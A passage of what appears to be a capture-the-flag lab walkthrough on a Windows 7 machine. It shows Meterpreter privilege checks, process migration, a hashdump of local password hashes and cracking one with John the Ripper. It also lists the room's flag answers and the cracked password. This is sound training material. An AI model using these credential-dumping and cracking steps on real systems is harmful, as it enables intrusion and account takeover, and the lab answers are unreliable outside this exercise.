</span></span><span class="line"><span class="cl">OS              : Windows <span class="m">7</span> <span class="o">(</span>6.1 Build 7601, Service Pack 1<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Architecture    : x64
</span></span><span class="line"><span class="cl">System Language : en_US
</span></span><span class="line"><span class="cl">Domain          : WORKGROUP
</span></span><span class="line"><span class="cl">Logged On Users : <span class="m">0</span>
</span></span><span class="line"><span class="cl">Meterpreter     : x64/windows
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see that the system is running Windows 7 x64</p>
<ul>
<li>Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command &lsquo;shell&rsquo; and run &lsquo;whoami&rsquo;. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.</li>
</ul>
<p>Using the getuid command I can see with which user we are currently interacting with</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span><span class="line"><span class="cl">Server username: NT AUTHORITY<span class="se">\S</span>YSTEM
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looks like we got system rights. The user NT AUTHORITY\SYSTEM has even more
rights than an administrator under Windows.</p>
<ul>
<li>List all of the processes running via the &lsquo;ps&rsquo; command. Just because we are system doesn&rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; ps
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Process <span class="nv">List</span>
</span></span><span class="line"><span class="cl"><span class="o">============</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> PID   PPID  Name                 Arch  Session  User                          Path
</span></span><span class="line"><span class="cl"> ---   ----  ----                 ----  -------  ----                          ----
</span></span><span class="line"><span class="cl"> <span class="m">0</span>     <span class="m">0</span>     <span class="o">[</span>System Process<span class="o">]</span>
</span></span><span class="line"><span class="cl"> <span class="m">4</span>     <span class="m">0</span>     System               x64   <span class="m">0</span>
</span></span><span class="line"><span class="cl"> <span class="m">416</span>   <span class="m">4</span>     smss.exe             x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           <span class="se">\S</span>ystemRoot<span class="se">\S</span>ystem32<span class="se">\s</span>mss.exe
</span></span><span class="line"><span class="cl"> <span class="m">460</span>   <span class="m">668</span>   LogonUI.exe          x64   <span class="m">1</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\L</span>ogonUI.exe
</span></span><span class="line"><span class="cl"> <span class="m">484</span>   <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM
</span></span><span class="line"><span class="cl"> <span class="m">568</span>   <span class="m">560</span>   csrss.exe            x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>srss.exe
</span></span><span class="line"><span class="cl"> <span class="m">616</span>   <span class="m">560</span>   wininit.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>ininit.exe
</span></span><span class="line"><span class="cl"> <span class="m">628</span>   <span class="m">608</span>   csrss.exe            x64   <span class="m">1</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>srss.exe
</span></span><span class="line"><span class="cl"> <span class="m">668</span>   <span class="m">608</span>   winlogon.exe         x64   <span class="m">1</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>inlogon.exe
</span></span><span class="line"><span class="cl"> <span class="m">716</span>   <span class="m">616</span>   services.exe         x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>ervices.exe
</span></span><span class="line"><span class="cl"> <span class="m">724</span>   <span class="m">616</span>   lsass.exe            x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\l</span>sass.exe
</span></span><span class="line"><span class="cl"> <span class="m">732</span>   <span class="m">616</span>   lsm.exe              x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\l</span>sm.exe
</span></span><span class="line"><span class="cl"> <span class="m">788</span>   <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM
</span></span><span class="line"><span class="cl"> <span class="m">844</span>   <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM
</span></span><span class="line"><span class="cl"> <span class="m">912</span>   <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE
</span></span><span class="line"><span class="cl"> <span class="m">960</span>   <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE
</span></span><span class="line"><span class="cl"> <span class="m">1124</span>  <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE
</span></span><span class="line"><span class="cl"> <span class="m">1216</span>  <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE
</span></span><span class="line"><span class="cl"> <span class="m">1244</span>  <span class="m">716</span>   TrustedInstaller.ex  x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM
</span></span><span class="line"><span class="cl">             e
</span></span><span class="line"><span class="cl"> <span class="m">1324</span>  <span class="m">716</span>   spoolsv.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>poolsv.exe
</span></span><span class="line"><span class="cl"> <span class="m">1368</span>  <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE
</span></span><span class="line"><span class="cl"> <span class="m">1388</span>  <span class="m">568</span>   conhost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onhost.exe
</span></span><span class="line"><span class="cl"> <span class="m">1464</span>  <span class="m">2564</span>  powershell.exe       x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span>
</span></span><span class="line"><span class="cl">                                                                               1.0<span class="se">\p</span>owershell.exe
</span></span><span class="line"><span class="cl"> <span class="m">1468</span>  <span class="m">716</span>   amazon-ssm-agent.ex  x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\P</span>rogram Files<span class="se">\A</span>mazon<span class="se">\S</span>SM<span class="se">\a</span>mazon-ssm-
</span></span><span class="line"><span class="cl">             e                                                                 agent.exe
</span></span><span class="line"><span class="cl"> <span class="m">1524</span>  <span class="m">716</span>   LiteAgent.exe        x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\P</span>rogram Files<span class="se">\A</span>mazon<span class="se">\X</span>enTools<span class="se">\L</span>iteAg
</span></span><span class="line"><span class="cl">                                                                               ent.exe
</span></span><span class="line"><span class="cl"> <span class="m">1680</span>  <span class="m">716</span>   Ec2Config.exe        x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\P</span>rogram Files<span class="se">\A</span>mazon<span class="se">\E</span>c2ConfigServic
</span></span><span class="line"><span class="cl">                                                                               e<span class="se">\E</span>c2Config.exe
</span></span><span class="line"><span class="cl"> <span class="m">1964</span>  <span class="m">844</span>   WmiPrvSE.exe         x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\w</span>miprvse.exe
</span></span><span class="line"><span class="cl"> <span class="m">1980</span>  <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE
</span></span><span class="line"><span class="cl"> <span class="m">2132</span>  <span class="m">844</span>   WmiPrvSE.exe
</span></span><span class="line"><span class="cl"> <span class="m">2228</span>  <span class="m">1324</span>  cmd.exe              x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe
</span></span><span class="line"><span class="cl"> <span class="m">2600</span>  <span class="m">716</span>   SearchIndexer.exe    x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM
</span></span><span class="line"><span class="cl"> <span class="m">2612</span>  <span class="m">716</span>   vds.exe              x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM
</span></span><span class="line"><span class="cl"> <span class="m">2736</span>  <span class="m">568</span>   conhost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onhost.exe
</span></span><span class="line"><span class="cl"> <span class="m">2856</span>  <span class="m">716</span>   mscorsvw.exe         x86   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework<span class="se">\v</span>4.0
</span></span><span class="line"><span class="cl">                                                                               .30319<span class="se">\m</span>scorsvw.exe
</span></span><span class="line"><span class="cl"> <span class="m">2888</span>  <span class="m">716</span>   mscorsvw.exe         x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span><span class="m">4</span>
</span></span><span class="line"><span class="cl">                                                                               .0.30319<span class="se">\m</span>scorsvw.exe
</span></span><span class="line"><span class="cl"> <span class="m">2928</span>  <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE
</span></span><span class="line"><span class="cl"> <span class="m">2972</span>  <span class="m">716</span>   sppsvc.exe           x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE
</span></span><span class="line"><span class="cl"> <span class="m">2996</span>  <span class="m">716</span>   svchost.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM
</span></span></code></pre></td></tr></table>
</div>
</div><p>We could use this one here <code>2888  716   mscorsvw.exe         x64   0        NT AUTHORITY\SYSTEM</code></p>
<p>This process if for the ms windows core services and it is running as SYSTEM</p>
<p>The process id is <code>2888</code></p>
<ul>
<li>Migrate to this process using the &lsquo;migrate PROCESS_ID&rsquo; command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; migrate <span class="m">2888</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Migrating from <span class="m">1464</span> to 2888...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Migration completed successfully.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looks like the migration worked fine.</p>
<hr>
<h2 id="task-4-cracking">Task 4: Cracking</h2>
<h3 id="dump-the-non-default-users-password-and-crack-it">Dump the non-default user&rsquo;s password and crack it!</h3>
<hr>
<ul>
<li>Within our elevated meterpreter shell, run the command &lsquo;hashdump&rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; hashdump
</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="cl">Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</span></span></code></pre></td></tr></table>
</div>
</div><p>The name of the non-default user is <code>Jon</code> here.</p>
<ul>
<li>Copy this password hash to a file and research how to crack it. What is the cracked password?</li>
</ul>
<p>Ok so let&rsquo;s copy the hash to a file <code>hash.txt</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&#34;</span> &gt; hash.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>the hash format should be NT</p>
<p>Let&rsquo;s try to crack it using john the ripper and use the wordlist rockyou.txt since it contains
a lot of commonly used passwords!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo john --format<span class="o">=</span>nt hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt                                      <span class="m">1</span> 
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>NT <span class="o">[</span>MD4 256/256 AVX2 8x3<span class="o">])</span>
</span></span><span class="line"><span class="cl">Warning: no OpenMP support <span class="k">for</span> this <span class="nb">hash</span> type, consider --fork<span class="o">=</span><span class="m">8</span>
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">alqfna22         <span class="o">(</span>Jon<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2022-04-09 03:26<span class="o">)</span> 1.923g/s 19616Kp/s 19616Kc/s 19616KC/s alr19882006..alpusidi
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=NT&#34;</span> options to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed.
</span></span></code></pre></td></tr></table>
</div>
</div><p>We successfully cracked the password hash!</p>
<p>The passwords for the user <code>Jon</code> is <code>alqfna22</code> !</p>
<hr>
<h2 id="task-5-find-flags">Task 5: Find flags!</h2>
<h3 id="find-the-three-flags-planted-on-this-machine-these-are-not-traditional-flags-rather-theyre-meant-to-represent-key-locations-within-the-windows-system-use-the-hints-provided-below-to-complete-this-room">Find the three flags planted on this machine. These are not traditional flags, rather, they&rsquo;re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!</h3>
<hr>
<ul>
<li>Flag1? This flag can be found at the system root.</li>
</ul>
<p>Let&rsquo;s switch back to our terminal session 1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; sessions -i <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting interaction with 1...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Shell Banner:
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
</span></span><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>and locate the flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd ..
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows&gt;cd ..
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\&gt;</span>dir
</span></span><span class="line"><span class="cl">dir
</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
</span></span><span class="line"><span class="cl"> Volume Serial Number is E611-0B66
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Directory of C:<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>
</span></span><span class="line"><span class="cl">03/17/2019  02:27 PM                <span class="m">24</span> flag1.txt
</span></span><span class="line"><span class="cl">07/13/2009  10:20 PM    &lt;DIR&gt;          PerfLogs
</span></span><span class="line"><span class="cl">04/12/2011  03:28 AM    &lt;DIR&gt;          Program Files
</span></span><span class="line"><span class="cl">03/17/2019  05:28 PM    &lt;DIR&gt;          Program Files <span class="o">(</span>x86<span class="o">)</span>
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Users
</span></span><span class="line"><span class="cl">03/17/2019  05:36 PM    &lt;DIR&gt;          Windows
</span></span><span class="line"><span class="cl">               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>             <span class="m">24</span> bytes
</span></span><span class="line"><span class="cl">               <span class="m">5</span> Dir<span class="o">(</span>s<span class="o">)</span>  20,617,707,520 bytes free
</span></span></code></pre></td></tr></table>
</div>
</div><p>the flag is called flag1.txt</p>
<p>let&rsquo;s get the contents of it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\&gt;</span><span class="nb">type</span> flag1.txt
</span></span><span class="line"><span class="cl"><span class="nb">type</span> flag1.txt
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>access_the_machine<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We managed to get the first flag!</p>
<ul>
<li>Flag2? This flag can be found at the location where passwords are stored within Windows.</li>
</ul>
<p>*Errata: Windows really doesn&rsquo;t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.</p>
<p>Passwords in windows are usually stored in the SAM database.</p>
<p>This database is located in <code>C:\Windows\System32\config</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig&gt;dir
</span></span><span class="line"><span class="cl">dir
</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
</span></span><span class="line"><span class="cl"> Volume Serial Number is E611-0B66
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Directory of C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">04/08/2022  08:11 PM    &lt;DIR&gt;          .
</span></span><span class="line"><span class="cl">04/08/2022  08:11 PM    &lt;DIR&gt;          ..
</span></span><span class="line"><span class="cl">12/12/2018  06:00 PM            28,672 BCD-Template
</span></span><span class="line"><span class="cl">04/08/2022  08:19 PM        18,087,936 COMPONENTS
</span></span><span class="line"><span class="cl">04/08/2022  08:20 PM           262,144 DEFAULT
</span></span><span class="line"><span class="cl">03/17/2019  02:32 PM                <span class="m">34</span> flag2.txt
</span></span><span class="line"><span class="cl">07/13/2009  09:34 PM    &lt;DIR&gt;          Journal
</span></span><span class="line"><span class="cl">03/17/2019  02:56 PM    &lt;DIR&gt;          RegBack
</span></span><span class="line"><span class="cl">03/17/2019  03:05 PM           262,144 SAM
</span></span><span class="line"><span class="cl">04/08/2022  08:20 PM           262,144 SECURITY
</span></span><span class="line"><span class="cl">04/08/2022  08:37 PM        40,632,320 SOFTWARE
</span></span><span class="line"><span class="cl">04/08/2022  08:33 PM        12,582,912 SYSTEM
</span></span><span class="line"><span class="cl">11/20/2010  09:41 PM    &lt;DIR&gt;          systemprofile
</span></span><span class="line"><span class="cl">12/12/2018  06:03 PM    &lt;DIR&gt;          TxR
</span></span><span class="line"><span class="cl">               <span class="m">8</span> File<span class="o">(</span>s<span class="o">)</span>     72,118,306 bytes
</span></span><span class="line"><span class="cl">               <span class="m">6</span> Dir<span class="o">(</span>s<span class="o">)</span>  20,617,707,520 bytes free
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is the file we are looking for.</p>
<p>It is <code>SAM</code>.</p>
<p>And here is our second flag!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig&gt;type flag2.txt
</span></span><span class="line"><span class="cl"><span class="nb">type</span> flag2.txt
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>sam_database_elevated_access<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</li>
</ul>
<p>This is a hint to look at the home directory of the admin user.</p>
<p>Let&rsquo;s see what he has hidden there &hellip;</p>
<p>There is no user <code>Administrator</code> in the directory <code>C:\Users</code>.</p>
<p>But instead there is a user folder for the user <code>Jon</code>.</p>
<p>Let&rsquo;s see what he is hiding there &hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers&gt;cd C:<span class="se">\U</span>sers<span class="se">\J</span>on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\J</span>on&gt;dir
</span></span><span class="line"><span class="cl">dir
</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
</span></span><span class="line"><span class="cl"> Volume Serial Number is E611-0B66
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Directory of C:<span class="se">\U</span>sers<span class="se">\J</span>on
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          .
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          ..
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Contacts
</span></span><span class="line"><span class="cl">12/12/2018  10:49 PM    &lt;DIR&gt;          Desktop
</span></span><span class="line"><span class="cl">12/12/2018  10:49 PM    &lt;DIR&gt;          Documents
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Downloads
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Favorites
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Links
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Music
